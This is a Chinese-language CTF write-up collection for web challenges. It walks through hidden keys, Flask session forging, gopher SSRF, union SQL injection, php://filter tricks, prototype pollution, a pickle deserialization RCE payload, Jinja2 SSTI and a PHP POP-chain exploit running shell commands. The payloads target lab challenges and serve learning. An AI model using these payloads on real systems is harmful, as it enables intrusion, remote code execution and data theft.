# **归途**

`ctrl`+`U`打开网页代码，发现html注释里面的`Key2-QDBtNG9k`

`ctrl`+`shift`+`I`打开控制台，发现key1，也可以在源码的js代码中找到  Key1-N2ghNUkkTQ==

js代码里面发现一个接口  /getKey?id=3 访问拿下 Key3-M0szeUVuKw==

根据接口提示，把id=3,改成id=4  ，Key4-ZXJUaDFzbGE=

根据提示在响应头上发现  Key5-ITkzdA==

然后用 Hackbar插件改成post传参，或者用postman，burpsuite都可以 拿下 Key6-ZnwxbGFA

然后有提示尝试登录，说明这个页面是有/login的，访问，发现给了账号密码，登录  `Do you know cookie(不能吃)? Try to login the account of "admin"`，cookie是服务器校验你的身份的一串字符，说明这个要改cookie，打开`ctrl`+`shift`+`I`点击application（应用），里面找到cookie，把user改为admin 然后刷新 拿下 Key7-NGFAZzY5Nmc5

根据提示让访问/robots.txt

> 这个/robots.txt是网页爬虫的时候要注意的里面有标识出哪些网页不能访问   ，但是ctf题目里面，一般这个disallow的网址里面都有信息 
>
> ```
> User-agent: *
> Disallow: /f13ggggg
> ```

最后一步，把所有key basr64解码，然后拼接起来 

7h!5I$M@0m4od3K3yEn+erTh1sla!93tf|1la@4a@g696g9然后输入进去，合成钥匙，拿下flag 





# **当零来敲门**

首先看到页面要求我们要在重新刷新之前输入到500，然后给我们flag，当然一个一个输入，没输几个就被清零了，所以要另想方法。

审计js代码 

```js

            await fetch('/chat', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user: u, msg: m})
            });
```

看到这个/chat接口是用来上传数字   方法是POST，body 要传入 {user: u , msg:数字}

所以要写python脚本，让他自动发，然后这个题又提供了，ssh连接服务器后台代码，比我们正常的python访问的路径不一样，直接跑 Python 是交互式解释器开销；SSH 连接的是**后台常驻的 Python 服务进程**，进程提前启动、加载完依赖，省去反复初始化耗时。

![image-20260916093716579](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260916093716579.png)

确定好传入的东西就可以写脚本了

```py
import requests

url = "http://127.0.0.1:8080/chat"  #题目说连接到8080端口，因为ssh连接到的直接是服务器后端

for i in range(1,501):    #500次循环，依次输入1到500
    data = {"user":"123","msg":i}
    
    response = requests.post(url=url,json=data)  #json要这样写，response是状态
    print(f"第{i}次",response)
    
```

然后ssh连接

```cmd
ssh challenger@127.0.0.1 -p <port>   ### 这个port是下面那个raw协议的端口
输入密码，然后把脚本复制运行
```

![image-20260916095401305](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260916095401305.png)

# **查分系统**

分析源码 ，看到是AES加密，给了个 iv  。根据上一个查分系统的学号信息发现学好开头是25 24 之类的，同时还发现 密文中有一个最长的，就是第47位，正是上一个查分系统的flag出处，可以大概确定学好的前两位了。然后爆破学号

```js
for (let i=0;i<encryptedStudentData.length;i++){
    console.log(i,encryptedStudentData[i]['数据'].length);
    
}
```

用这个脚本或者看前端代码，会发现第47个数据异常的长

```js
(async() => {
    const record = encryptedStudentData[46];
    
    for (let i=0;i < 1000000 ;i++){
        const sid = '25' + String(i).padStart(6,"0");
        
        try {
            const student = await tryDecrypt(record, sid);
            
            console.log("找到了");
            console.log("学号:",sid);
            return;
        }
        catch(e){}
        if (i % 10000 ===0){
            console.log("正在尝试:",sid)
        }
    }
})();
```

爆破出来学号，查找即可得

# **MoeCatchTheFrogs**

## 题目分析

抓青蛙，永远不可能抓到8，因为我用js连点器，连点了100000 次

捕获青蛙后，会有cookie记录你的身份

```
frog_session:eyJmcm9ncyI6WzJdfQ.aqn5Og.Yh507HBol6s0_9C1s9cIEx5eExs
```

一看这个组成，感觉是JWT token 

> JWT 由三部分组合，第一部分Header 第二部分 Payload 第三部分 Signature

[JWT解析网站](https://www.jwt.io/)

观察 Cookie 格式，以`.`分割为三段：`eyJmcm9ncyI6WzJdfQ.aqn5Og.Yh507HBol6s0_9C1s9cIEx5eExs`。

- 第一段经过 Base64 解码可直接读取存储的数据；   解编码后是 frog:[0,1,2]这样的
- 第二段会随请求时间动态变化，为时间戳；
- 第三段是对前两部分使用密钥进行 HMAC 签名得到的校验串。

该特征**不是 JWT**，符合 Flask session 的结构。Flask 框架将 session 存储在 Cookie 中，由`itsdangerous`库实现签名，默认使用 HMAC-SHA1 算法。session 内容仅做 Base64 编码，并非加密；在不知道`SECRET_KEY`的情况下无法篡改数据，一旦修改内容签名校验失败，服务端会丢弃 session。

python的`flask-unisgn`包有专门解觉这个问题的命令

```py
pip install flask-unsign
#安装这个包

#查看session内容
flask-unsign --decode --cookie 'eyJmcm9ncyI6WzAsMl19.aqowvQ.qMp1aZiJbpN1KbgM1dzxg-DmeJk'

#用字典爆破密钥
flask-unsign --unsign --cookie 'eyJmcm9ncyI6WzAsMl19.aqowvQ.qMp1aZiJbpN1KbgM1dzxg-DmeJk' --wordlist <字典位置> --no-literal-eval              # 爆破出来的  qwe123456 

#构造新的session
flask-unsign --sign --cookie “{'frog‘:[0,1,2,3,4,5,6,7,8]}" --secret 'qwe123456'
```

![image-20260916142518758](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260916142518758.png)

得到cookie直接替换frog_session访问这个接口，或者直接点击领取就拿下flag



> 为什么只改第一段不行，第一段很简单就是一个base编码，Flask session 的第三段**签名**，是用 `SECRET_KEY` 对 **【Base64 编码后的 payload + 时间戳】** 一起做 HMAC-SHA1 计算出来的。所以只改第一个没啥用

1. Flask session 和 JWT 外观相似，需要区分：JWT 三段为`Header.Payload.Signature`，Flask session 是`payload.timestamp.signature`，第二段是时间戳，会随时间改变，这是最直观的区分特征。
2. 部分 session 会开启 zlib 压缩，cookie 以`.`开头，`flask-unsign`会自动处理解压，无需手动操作。

JWT 签名：Header+Payload 一起签名 Flask session 签名：Payload+Timestamp 一起签名 共同点：**任意一部分改动，签名就失效，必须重签**

## 工具说明

flask-unsign是专门针对 Flask session 的工具，底层基于 itsdangerous 库的签名机制，在pycharm终端就可以下载应用

--wordlist 后面的字典可以上github上下一个rouckou字典



![image-20260916143640809](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260916143640809.png)

![image-20260916143725142](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260916143725142.png)



# 熊出没

## ssrf

提示是一个ssrf漏洞，先介绍一下ssrf，通俗的讲，ssrf就是你想访问某些敏感页面，你不没权限访问，但是因为服务器没有限制好，你能让服务器帮你访问。



例如    现在有个接口，get /fetch?url=http:xxxx

正常流程是   用户浏览器访问  ->  网站服务器  -> 访问到

但是如果 你的访问url是  127.0.0.1:port    此时网站会访问这个，注意此时的127.0.0.1是服务器本地的地址，然后就可以拿到一些内网 IP 内部管理后台 云服务器元数据接口

## 解题

随便输入一个不是一个url的  会回显❌ URL不合法！请输入完整的 URL 地址（需包含协议和主机，例如 gopher://host:port/...）。

题目描述有蜂蜜在端口 **54321**

所以  **gopher://127.0.0.1:54321**    回显示了     **paths: /secret-honey**

> 注意：**gopher的形式  gopher://IP:PORT/_数据**     数据前面随便加一个字符就可以拿下

```
最终的payload    ： gopher://127.0.0.1:54321//secret-honey
```

## Gopher协议

Gopher 可以让 SSRF 发起者控制发送给 TCP 服务的数据，因此常用于 SSRF → Redis、MySQL、FastCGI 等服务的利用。

```
基本形式:  gopher://127.0.0.1:端口/_数据
```

如果想构造一个http请求

```
GET /admin HTTP/1.1\r\n
Host:127.0.0.1\r\n
\r\n
```

如果想让这些tcp数据让gopher请求 ，就要进行一次ur编码

gopher://127.0.0.1:8080/_GET%20/admin%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0A%0D%0A

> **实际上，是请求之后，url解析器先解析，然后到gopher解析就是我们上传的数据形式了**

如果是利用 ?url=gopher://xxxxx            就编码两次

如果有网页跳转，跳转几次编码几次

# 河湖小盗

首先进入页面，是个查询系统，输入 1 查询出来一行数据 ，这种就考虑sql注入

- 首先   **1 or 1=1**     发现有sql注入 ，是数字型注入
- **1 order by 4**报错了  但是 **1 order by 3**正常回显了1的数据，**证明数据有三列，会显位置有三个**

-  下一步就是 `union` 联合注入   **1 union select 1,2,3#**

![image-20260917090721486](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260917090721486.png)

- 爆数据库      **1 union select 1,database(),3#**                      **past_paper**

- 爆表名         **1 union select 1,2,table_name from information_schema.tables where table_schema=database()#**

![image-20260917091035833](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260917091035833.png)

- 爆字段名       **1 union select 1,2,column_name from information_schema.columns where table_name = 'flag_table'#**

![image-20260917091159227](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260917091159227.png)

- 爆flag      **1 union select 1,2,grouP_concat(flag) from flag_table#**             出来flag



# **七狗免费小说**

## 题目分析

题目提示说是php://伪协议 

- **file=php://filter/read=convert.base64-encode/resource=flag.php**

- **file=php://filter/string.rot13/resource=flag.php**

  这些都不行，会被waf拦截，

  只输入php://filter只会报错，不会被拦截

  因此还有

  ```
  php://filter/zlib.deflate/resource=flag.php
  ```

  `zlib.deflate` 会把 `flag.php` 的内容用 zlib 压缩后再输出。
  所以浏览器/终端里看到的是一串乱码，也就是 zlib 压缩流。

**然后就拿到一串zlib压缩流**

用脚本解

```py
import base64
import zlib

b_str = 'lZDRToJwGMXvfQrmumWGEGuL8K73EIbZZtNlV7W2jMyIhGquzOFKV6K2xNpaTKFe5v99/LviFYI3qItzdb5zvt+OVKiVa5mVUqW4zWwy2d2qpu6XDjlVKa6JIscW+XWNXRU1geUUTmN5XhAEPs+LqpA/ym5kNLVcZbJbaRjmb+CMiX/x0x/GwSXYU3QM2phi14p6p2SxQKNN9TByTOo2JGVPBmNCfDPxwHBRb8bBAzy5ODrBrifVZTp8gbkN50u40tEyyOJMytVlEjr0uAmNT2zd4PsAO18JRC7H0O97nH3gbQte79JvoRN1xilC16PuCOxr5qCyozBgmVEwSehI+Ai2R5bPxG9HswHM9DjopUXJGH/Rf04LcuYX'

result = base64.b64decode(b_str)

#zlib解压
decompress = zlib.decompress(result,-15)    #因为这个zlib有固定头部，这个是raw deflate 格式：没有 zlib 头
print(decompress.decode('utf-8'))
```

![image-20260917093503889](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20260917093503889.png)

## `zlib.decompress(data, wbits)` 的第二个参数

`wbits` 控制压缩流的格式和窗口大小：

| `wbits` 值   | 含义                                                 |
| :----------- | :--------------------------------------------------- |
| `15`（默认） | 标准 zlib 格式：有 2 字节头 + 4 字节 Adler-32 校验和 |
| `-15`        | raw deflate 格式：没有 zlib 头，也没有校验和         |
| `31`         | gzip 格式（15 + 16）                                 |
| `47`         | 自动检测 zlib 或 gzip（15 + 32）                     |



# **合乎周礼**

进去页面看到4个接口，功能不同 看/api/help口发现

```
只有审核 isAdmin=true 且 canReadFlag=true 时返回 FLAG"
```

 POST api/profile能上传json数据，注意用POST方法，application/json   

试着写一个json数据进去

```
{"abc":"123"}

//写完之后得变化
{
  "ok": true,
  "acceptedFields": 2,
  "profile": {
    "profile": {
      "nickname": "guest"
    },
    "theme": {
      "color": "blue"
    },
    "abc": "123",
    "nz6zb6bxig": "="
  },
  "inheritedProbe": {
    "isAdmin": null,
    "canReadFlag": null
  }
}
```

可以看到写写道profile属性里面了，我们要改变inheriyedProbe里面得数据，这就要通过原生链污染

```
__proto__  : 向上寻找父类 ，直接在父类改变isAdmin和CanReadFlag的值
payload:
{"__proto__":{"isAdmin":true,"canReadFlag":true}}
```

# 礼崩乐坏

跟上面一样，原生连污染，不过这个禁用`__proto__`

那我们用构造方法的payload

```
{"constructor.prototype.isAdmin":true,"constructor.prototype.canReadFlag":true}
```

# **日志系统**

给了源代码

```
import pickle
import time
import uuid
from urllib.parse import quote

from flask import Flask, request, redirect, Response, render_template

app = Flask(__name__)

# 内存中的日志列表，每条日志是一个对象
LOGS = []


class LogEntry:
    """
    小D觉得用自定义对象比字典更有面向对象的感觉，
    并且导出/导入时直接用 pickle 序列化整个列表，方便又强大！
    """

    def __init__(self, title, content):
        self.id = uuid.uuid4().hex[:8]
        self.title = title
        self.content = content
        self.created_at = time.strftime("%Y-%m-%d %H:%M:%S")

    def to_dict(self):
        return {
            "id": self.id,
            "title": self.title,
            "content": self.content,
            "created_at": self.created_at,
        }


def get_logs_for_display():
    result = []
    for log in LOGS:
        if isinstance(log, LogEntry):
            result.append(log.to_dict())
        else:
            result.append(log)
    return result


@app.route("/")
def index():
    msg = request.args.get("msg", "")
    err = request.args.get("err", "")
    return render_template(
        "index.html",
        msg=msg,
        err=err,
        logs=get_logs_for_display(),
    )


@app.route("/add", methods=["POST"])
def add():
    title = request.form.get("title", "").strip()
    content = request.form.get("content", "").strip()
    if not title or not content:
        return redirect("/?err=标题和内容不能为空")
    LOGS.append(LogEntry(title, content))
    return redirect("/?msg=日程添加成功")


@app.route("/export")
def export():
    data = pickle.dumps(LOGS)
    return Response(
        data,
        mimetype="application/octet-stream",
        headers={"Content-Disposition": "attachment; filename=logs.pkl"},
    )


@app.route("/import", methods=["POST"])
def import_logs():
    """
    小D为了兼容各种数据，直接对上传内容执行反序列化，
    还能把还原出来的对象直接展示出来，方便预览。
    """
    f = request.files.get("file")
    if not f or not f.filename:
        return redirect("/?err=请选择要导入的文件")
    data = f.read()
    if not data:
        return redirect("/?err=文件内容为空")
    try:
        obj = pickle.loads(data)
    except Exception as e:
        return redirect("/?err=反序列化失败：" + str(e)[:200])

    # 兼容单条/多条日志
    if isinstance(obj, list):
        n = 0
        for item in obj:
            LOGS.append(item)
            n += 1
        return redirect("/?msg=" + quote("成功导入 {} 条日程".format(n)))

    # 单个对象 / 其他：把反序列化结果直接展示出来供预览
    preview = str(obj).replace("\n", " ").replace("\r", " ").strip()[:200]
    return redirect("/?msg=" + quote("导入预览结果：" + preview))


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=20005, debug=False)
```

审计源码看，这是一个带有文件上传和日志输出的系统，` obj = pickle.loads(data)`反序列化。Python 的 `pickle` 模块可以将 Python 对象序列化保存到文件中，也可以通过 `pickle.load()` 将对象重新加载。

需要注意的是，`pickle` 并不是一个安全的数据交换格式。反序列化不可信的 Pickle 数据时，可能触发任意代码执行。

关键代码是：

```python
def __reduce__(self):
    return (os.system, ("id",))
```

`__reduce__()` 可以告诉 Pickle：在恢复这个对象时应该使用什么函数以及传入什么参数。

这里返回：

```python
(os.system, ("id",))
```

可以理解为：

```python
os.system("id")
```

因此，当这个恶意 Pickle 数据被反序列化时，就可能执行系统命令。

python 反序列化的时候不仅会对对象进行操作，其中还会自动调用一些方法，

直接写payload

```py
import subprocess
import pickle


class LogEntry:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))


payload = pickle.dumps(LogEntry())

with open("evil.pkl", "wb") as f:
    f.write(payload)
```



发现可以RCE，那么就开始找flag，最终发现在环境变量里面，但是这个题输出的数据数量有限制

```
["sh","-c","env | grep -i flag"] //用shell指令，用环境变量里面寻找flag字段  -i不区分大小写
["sh","-c","printenv FLAG"]//也可以
```

> 注意subprocess.check_output这个函数第二个参数要用列表写，要调用shell命令时要加 `sh -c `

# **bblogin**

```py
import sys
import secrets
from flask import Flask, request, session, jsonify, redirect, url_for
from flask import render_template_string


def match(a,b):
    for i in a:
        if(i in b):
            return True;
    return False
def create_app():
    app = Flask(__name__)

    app.secret_key = secrets.token_hex(32)
    Rea1f1Agg999mjytredcvbhjytredf = sys.argv[1] if len(sys.argv) > 1 else 'flag{fake_flag}'
    I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt = secrets.token_hex(32)


    INDEX_TEMPLATE = '''<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>用户管理系统</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: #fff; border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px 36px; width: 380px;
    }
    h1 { font-size: 22px; color: #333; text-align: center; margin-bottom: 8px; }
    .subtitle { font-size: 13px; color: #888; text-align: center; margin-bottom: 28px; }
    .form-group { margin-bottom: 18px; }
    label { display: block; font-size: 14px; color: #555; margin-bottom: 6px; font-weight: 500; }
    input[type="text"], input[type="password"] {
      width: 100%; padding: 11px 14px; border: 1.5px solid #ddd;
      border-radius: 8px; font-size: 15px; outline: none; transition: border-color 0.2s;
    }
    input:focus { border-color: #667eea; }
    button {
      width: 100%; padding: 12px;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      color: #fff; border: none; border-radius: 8px;
      font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px;
    }
    button:hover { opacity: 0.9; }
    .error {
      background: #fff0f0; color: #d33; border: 1px solid #fcc;
      border-radius: 8px; padding: 10px 12px; font-size: 14px;
      margin-bottom: 16px; text-align: center;
    }
  </style>
</head>
<body>
  <div class="card">
    <h1>用户管理系统</h1>
    <p class="subtitle">这是一个简单的用户管理系统，请输入用户名和密码登录</p>

    {login_error_block}

    <form method="POST" action="/login">
      <div class="form-group">
        <label for="username">用户名</label>
        <input type="text" id="username" name="username" placeholder="请输入用户名" required />
      </div>
      <div class="form-group">
        <label for="password">密码</label>
        <input type="password" id="password" name="password" placeholder="请输入密码" required />
      </div>
      <button type="submit">登 录</button>
    </form>
  </div>
</body>
</html>'''

    USERINFO_TEMPLATE = '''<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>用户信息</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      min-height: 100vh;
      display: flex; align-items: center; justify-content: center;
    }
    .card {
      background: #fff; border-radius: 12px;
      box-shadow: 0 20px 60px rgba(0,0,0,0.3);
      padding: 40px 36px; width: 420px; text-align: center;
    }
    .avatar {
      width: 72px; height: 72px; border-radius: 50%;
      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
      display: flex; align-items: center; justify-content: center;
      margin: 0 auto 20px; font-size: 32px; color: #fff;
    }
    h1 { font-size: 22px; color: #333; margin-bottom: 24px; }
    h1 span { color: #667eea; font-weight: 700; }
    .secret-box {
      background: #f7f8ff; border: 1.5px solid #e0e4ff;
      border-radius: 10px; padding: 20px; text-align: left;
    }
    .secret-box .label { font-size: 13px; color: #888; margin-bottom: 8px; }
    .secret-box .info { font-size: 16px; color: #333; line-height: 1.6; word-break: break-word; }
    .loading { color: #888; font-size: 15px; padding: 20px 0; }
    .error-msg {
      background: #fff0f0; color: #d33; border: 1px solid #fcc;
      border-radius: 8px; padding: 12px 16px; font-size: 14px;
    }
    .logout-btn {
      display: inline-block; margin-top: 24px; padding: 9px 28px;
      background: transparent; border: 1.5px solid #ccc; border-radius: 8px;
      font-size: 14px; color: #666; cursor: pointer; text-decoration: none;
    }
    .logout-btn:hover { border-color: #667eea; color: #667eea; }
  </style>
</head>
<body>
  <div class="card">
    <div class="avatar">👤</div>
    <h1>欢迎 <span id="usernameEl">加载中...</span></h1>
    <div id="content"><p class="loading">正在获取您的信息...</p></div>
    <a class="logout-btn" href="/">退出登录</a>
  </div>
  <script>
    async function loadUserInfo() {
      const usernameEl = document.getElementById('usernameEl');
      const contentEl  = document.getElementById('content');
      try {
        const res = await fetch('/user');
        if (!res.ok) { window.location.href = '/'; return; }
        const data = await res.json();
        usernameEl.textContent = data.username || '未知用户';
        contentEl.innerHTML = '<div class="secret-box">'
          + '<div class="label">🔒 这是你的秘密信息</div>'
          + '<div class="info">' + (data.info || '暂无') + '</div></div>';
      } catch (e) {
        usernameEl.textContent = '用户';
        contentEl.innerHTML = '<div class="error-msg">无法连接服务器，请稍后重试</div>';
      }
    }
    loadUserInfo();
  </script>
</body>
</html>'''


    @app.route('/')
    def index():
        html = INDEX_TEMPLATE.replace('{login_error_block}', '')
        return render_template_string(html)

    @app.route('/userInfo.html')
    def user_info_page():
        return render_template_string(USERINFO_TEMPLATE)

    @app.route('/login', methods=['POST'])
    def login():
        username = request.form.get('username', '')
        password = request.form.get('password', '')
        if(len(username)>10 or match(".()[]_",username)):
            error_html = f'<div class="error"><p>The username cannot be too long!</p></div>'
            html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)
            return render_template_string(html)
        if username == 'admin' and password == I3TheAdMin_pa3vv0rc1dswer5t6yuhgfdrt:
            session['token'] = "admin"
            return redirect(url_for('user_info_page'))

        error_html = f'<div class="error"><p>用户{username}登录失败</p></div>'
        html = INDEX_TEMPLATE.replace('{login_error_block}', error_html)
        return render_template_string(html)

    @app.route('/user')
    def get_user():
        token = session.get('token')
        if token and token == "admin":
            return jsonify(username='admin', info=Rea1f1Agg999mjytredcvbhjytredf)
        return jsonify({'error': '未登录'}), 401

    return app


app = create_app()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=20001, debug=False)

```

源码如上，`render_template_string(html)`直接渲染，有sstl注入在username那里试了一下 `{{7*7}}`返回了 49 ，`{{7*'7'}}`返回了777777,是flask的jinja2模板。

```
{{ config }} 获取配置
{{ self }}
```

{{config}}获取secret_key之后，有知道了cookie叫 session ,有要伪造 token =admin

那就运用我们的 `flask-unsign`

```py
(base) (.venv2) PS D:\浏览器下载\Python_attachments> flask-unsign --sign --cookie "{'token':'admin'}" --secret 'd47659ecb0d6b40c07820618c253bc5146a4c092248ac223ac6d5effed58362d'
D:\python\Lib\site-packages\requests\__init__.py:109: RequestsDependencyWarning: urllib3 (2.6.3) or chardet (7.4.3)/charset_normalizer (2.0.12) doesn't match a supported version!
  warnings.warn(
eyJ0b2tlbiI6ImFkbWluIn0.ar5ZpQ.SHW4kWu2YAVg_XrSl7bPwsPbJDg
```

然后加上cookie   ：  session=eyJ0b2tlbiI6ImFkbWluIn0.ar5ZpQ.SHW4kWu2YAVg_XrSl7bPwsPbJDg ，访问/user接口，拿下flag，源码注释中有这一点

> 要注意一下，flask-unsign命令在写--cookie时要写双引号   ，"  "



# 黑货走私

这个叫做HTTP请求走私

先访问/hint，发现是JWT，jwt由三部分组成，header，payload和signature 要知道加密的密钥才能伪造

[jwt伪造](https://www.jwt.io/)

hint页面给了几个密钥，去加密出jwt token发现 `fish`密钥的跟他提供的一样

![image-20261001215631529](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20261001215631529.png)

按照提示把role改成admin，scope值改为flags，构造新的jwt

两个走私，第一个 前端是CL,后端是TE，CL是以content-length的长度来判断是否结束，而TE是根据 0\r\n\r\n也判断结束

第一个走私http请求

![image-20261001231439111](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20261001231439111.png)



![image-20261001232511873](C:/Users/YS/AppData/Roaming/Typora/typora-user-images/image-20261001232511873.png)





# **七狗收费小说**

用 dirsearch扫描出来有 /.git泄露

用 GitHack工具拿下源码

```php
<?php
// 小刻可是学了最新的 PHP 8 哦，快夸夸小刻
error_reporting(0);

class User
{
    public $username, $password;
    public $secret_a, $secret_b;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
        $this->secret_a = $this->secret_b = 0;
    }

    public function __wakeup()
    {
        // 每次都要重新登录，这样坏人肯定进不来啦
        $this->secret_b = random_int(1000_0000, 9999_9999);
    }

    public function __destruct()
    {
        if ($this->username !== $this->password)
            die("不对，密码不对！");
        if ($this->secret_a !== $this->secret_b)
            die("不行，要重新登录！");

        echo "已经登录啦：$this->username";
    }
}

class UserInfo
{
    public $user, $permission;

    public function __construct($user)
    {
        $this->user = $user;
        $this->permission = $user->username === "admin" ? "权限 7" : "权限 0";
    }

    public function __tostring()
    {
        return $this->user->username . "（权限等级：" . $this->permission . "）";
    }
}

class Diagnosis
{
    public $key, $value, $action;

    public function __get($name)
    {
        if ($name === $this->key && is_object($this->action)) {
            return ($this->action)($this->value);
        }
        return null;
    }

    public function __invoke($value)
    {
        return shell_exec("$this->key$value");
    }
}
    $curr_user = null;

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $user = new User($username, $password);

    $data = base64_encode(serialize($user));
    setcookie('user', $data, time() + 3600, '/');
    $curr_user = $user;

} elseif (isset($_COOKIE['user'])) {
    $data = base64_decode($_COOKIE['user']);
    $curr_user = unserialize($data);
}
?>

```

  反序列化漏洞

Diagnosis里的__invoke方法有shell_exec，说明是脆弱点，类调用属性当作方法时会调用\_\_invoke;

因此到`__get方法，当实例调用没有的属性时会调用__get`，因此链路到UserInfo的__tostring

当实例被当作字符串的时候，会触发__tostring，

到此连接到了首部  __destruct

> 注意PHP8不能用实例数量绕过wakeup，本体运用引用赋值，把secret_a 和secret_b指向同一块地址，因此这两个值就相等了

pop链构造代码

```php
<?php

class User
{
    public $username, $password;
    public $secret_a, $secret_b;
}

class UserInfo
{
    public $user, $permission;
}

class Diagnosis
{
    public $key, $value, $action;
}    

//第一层 diagnosis
$first = new Diagnosis();
$first ->key = "username";   // UserInfo里调用username未果后传username为get的参数，因此即赋值key为这个
$first ->value = ";ls /";   //命令改 cat /flag 拿flag      | 管道符   || 也可以 
$first ->action = $first; 

//
$second = new UserInfo();
$second ->user = $first; //$first没有username属性，pop链连接

//
$last = new User();
$last -> username = $second;   //echo $username即将$second实例当字符串输出，自动调用tostring
$last -> password = $second;
$last -> secret_b = 0;
//注意wakeup方法会改变secret_b的值
$last->secret_a = &$last->secret_b;//引用赋值，这样就能保证a，b相等


$payload = serialize($last);
echo $payload;
?>

    
//O:4:"User":4:{s:8:"username";O:8:"UserInfo":2:{s:4:"user";O:9:"Diagnosis":3:{s:3:"key";s:8:"username";s:5:"value";s:6:"||ls /";s:6:"action";r:3;}s:10:"permission";N;}s:8:"password";r:2;s:8:"secret_a";i:0;s:8:"secret_b";R:9;}
```

然后再base64之后赋值给Cookie:user=xxxx,执行命令，拿下flag

# 
